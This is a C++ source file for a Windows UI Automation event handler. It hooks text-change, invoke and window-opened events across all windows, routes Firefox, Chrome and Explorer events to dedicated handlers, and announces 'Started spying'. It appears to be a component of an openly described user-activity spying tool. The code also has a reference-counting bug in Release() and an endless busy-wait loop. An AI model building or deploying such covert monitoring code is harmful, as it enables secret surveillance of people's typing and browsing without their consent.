#include "MyAutomationEventHandler.h"
#include "Errors.h"
#include "Finder.h"
#include "Logger.h"
#include "Helpers.h"

MyAutomationEventHandler::MyAutomationEventHandler() : refCount(1), eventCount(0)
{
}

ULONG STDMETHODCALLTYPE MyAutomationEventHandler::AddRef()
{
	return InterlockedIncrement(&refCount);
}

ULONG STDMETHODCALLTYPE MyAutomationEventHandler::Release()
{
	ULONG refCount = InterlockedDecrement(&refCount);
	if (refCount == 0)
	{
		delete this;
		return 0;
	}
	return refCount;
}

ULONG STDMETHODCALLTYPE MyAutomationEventHandler::GetEventCount()
{
	return eventCount;
}

VOID STDMETHODCALLTYPE MyAutomationEventHandler::IncrementEventCount()
{
	InterlockedIncrement(&eventCount);
}

HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::QueryInterface(REFIID riid, void** ppInterface)
{
	if (riid == __uuidof(IUnknown))
		*ppInterface = static_cast<IUnknown*>(this);
	else if (riid == __uuidof(IUIAutomationEventHandler))
		*ppInterface = static_cast<IUIAutomationEventHandler*>(this);
	else
	{
		*ppInterface = NULL;
		return E_NOINTERFACE;
	}
	this->AddRef();
	return S_OK;
}

HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::HandleAutomationEvent(IUIAutomationElement* pAutomationElement, EVENTID eventID)
{
	auto now = std::chrono::steady_clock::now();

	if (now - lastEventTime < GetEventTimeout())
	{
		//Log(L"Too fast events...", DBG);
		return ERROR_SUCCESS;
	}

	lastEventTime = now;

	HRESULT hr;
	DWORD pid = Finder::GetPIDByUIAutomationElement(pAutomationElement);

	if (pid == -1)
	{
		Log(L"MyAutomationEventHandler::HandleAutomationEvent() invalid PID Received", DBG);
		return ERROR_SUCCESS;
	}

	std::wstring wsFileName = Finder::GetModuleNameFromPid(pid);
	if (wsFileName.empty())
	{
		Log(L"MyAutomationEventHandler::HandleAutomationEvent() invalid wsProcName Received", DBG);
		return ERROR_SUCCESS;
	}

	IncrementEventCount();

	std::wstring wsProcName = Helpers::GetApplicationName(wsFileName);
	std::wstring wsEventString = Helpers::EventIdToString(eventID);
	std::wstring wsDate = Helpers::GetCurrentDateTime();

	Log(L"New event " + wsEventString + L" from " + wsProcName + L" Time: " + wsDate, DBG);

	if (g_IgnoreHandlers)
	{
		HandleOther(pAutomationElement, wsProcName, wsEventString, wsDate, eventID);
	}
	else {
		std::unordered_map<std::wstring, std::function<void()>> handlers = {
			{ L"firefox.exe", [this, pAutomationElement, wsProcName, wsEventString, wsDate, eventID]() { HandleFirefox(pAutomationElement, wsProcName, wsEventString, wsDate, eventID); } },
			{ L"chrome.exe", [this, pAutomationElement, wsProcName, wsEventString, wsDate, eventID]() { HandleChrome(pAutomationElement, wsProcName, wsEventString, wsDate, eventID); } },
			{ L"explorer.exe", [this, pAutomationElement, wsProcName, wsEventString, wsDate, eventID]() { HandleExplorer(pAutomationElement, wsProcName, wsEventString, wsDate, eventID); } }
		};

		auto it = handlers.find(Helpers::ConvertToLower(wsProcName));

		if (it != handlers.end()) {
			it->second();
		}
		else {
			HandleOther(pAutomationElement, wsProcName, wsEventString, wsDate, eventID);
		}
	}

	return ERROR_SUCCESS;
}

void STDMETHODCALLTYPE MyAutomationEventHandler::SetEventTimeout(int seconds)
{
	this->eventTimeout = std::chrono::seconds(seconds);
}

std::chrono::seconds MyAutomationEventHandler::GetEventTimeout()
{
	return this->eventTimeout;
}

HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::Deploy(IUIAutomation* pAutomation, IUIAutomationElement* pAutomationElement, int timeout)
{
	MyAutomationEventHandler* pMyAutomationEventHandler = new MyAutomationEventHandler();

	pMyAutomationEventHandler->SetEventTimeout(timeout);

	HRESULT hr;
	BSTR bName;

	if (!pAutomationElement)
	{
		Log(L"Monitoring all windows", INFO);
		pAutomation->GetRootElement(&pAutomationElement);
	}

	hr = pAutomationElement->get_CurrentName(&bName);

	if (SUCCEEDED(hr))
	{
		std::wstring wname(bName, SysStringLen(bName));
		Log(L"Window Name: " + wname, INFO);
	}

	// dont forget about adding event handling in apps.cpp
	std::vector<EVENTID> eventIds = {
			UIA_Text_TextChangedEventId,
			UIA_Invoke_InvokedEventId,
			UIA_Window_WindowOpenedEventId,
	};

	for (size_t i = 0; i < eventIds.size(); i++)
	{
		HRESULT hr = pAutomation->AddAutomationEventHandler(eventIds[i], pAutomationElement, TreeScope_Subtree, NULL, (IUIAutomationEventHandler*)pMyAutomationEventHandler);
		if (FAILED(hr)) {
			Log(L"Failed to add event handler for event ID: " + std::to_wstring(eventIds[i]), WARNING);
			PrintErrorFromHRESULT(hr);
		}
	}

	Log(L"Started spying using MyAutomationEventHandler", INFO);

	while (1) {}

	return ERROR_SUCCESS;
}